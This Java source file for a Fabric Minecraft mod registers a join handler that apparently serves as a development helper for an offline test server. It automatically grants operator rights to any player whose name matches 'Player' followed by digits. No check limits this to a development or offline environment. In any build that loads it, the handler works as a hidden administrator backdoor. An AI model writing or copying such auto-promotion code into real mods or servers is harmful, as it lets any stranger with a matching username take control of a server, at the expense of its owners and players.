package fr.zazac1.customloottables.testsupport;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.networking.v1.ServerPlayConnectionEvents;
import net.minecraft.text.Text;

import java.util.regex.Pattern;

/** Development-only conveniences for the local offline test server. */
public final class DevelopmentServerSupport implements ModInitializer {
    private static final Pattern TEST_PLAYER = Pattern.compile("Player[0-9]+");

    @Override
    public void onInitialize() {
        ServerPlayConnectionEvents.JOIN.register((handler, sender, server) -> {
            var player = handler.getPlayer();
            String name = player.getGameProfile().getName();
            if (!TEST_PLAYER.matcher(name).matches()) return;

            server.getPlayerManager().addToOperators(player.getGameProfile());
            player.sendMessage(Text.literal("[Custom Loot Tables] Development account promoted to operator."), false);
        });
    }
}
